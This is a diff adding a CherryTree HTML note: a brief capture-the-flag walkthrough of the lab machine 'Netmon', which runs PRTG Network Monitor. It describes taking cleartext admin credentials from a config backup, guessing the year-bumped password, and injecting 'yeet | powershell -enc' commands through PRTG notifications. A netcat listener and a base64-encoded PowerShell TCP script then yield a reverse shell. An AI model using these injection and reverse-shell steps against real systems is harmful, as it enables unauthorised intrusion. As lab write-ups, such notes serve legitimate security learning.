@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.10.10.152 Netmon</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.10.10.152 Netmon</h1><br/>Ftp anonymous in and grab user.txt<br />see that the machine is running PRTG Bandwidth monitor. Research shows that the website data is located at <code>C:\ProgramData\Paessler\PRTG Network Monitor\</code>.<br />PRTG Configuration.old.bak  is the oldest files. moreing through shows cleartext passwords. <br />              &lt;!-- User: prtgadmin --&gt;                                                          &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />              PrTg@dmin2018                     PrTg@dmin2019    <br />added one to the password to make it match the year and I got in<br /><br />under the notifications piece I was able to invoke a powershell command with the syntax<br />yeet | ping 10.10.14.60 (caught with tcp dump)<br />started nc listener<br />i then tried to run Invoke-PowerShellTcp.ps1. It failed (probably due to bad charachters)<br />copied a base64 encoded copy of the ps1 script with this command<br />cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard       &lt; base64 encodes script and copies to clipboard!<br />yeet | powershell -enc olkjsdflkjsdlfkjsldkjfsadl;kfj== <br />Enjoy the system shell!!<br /><br /></div></body></html>
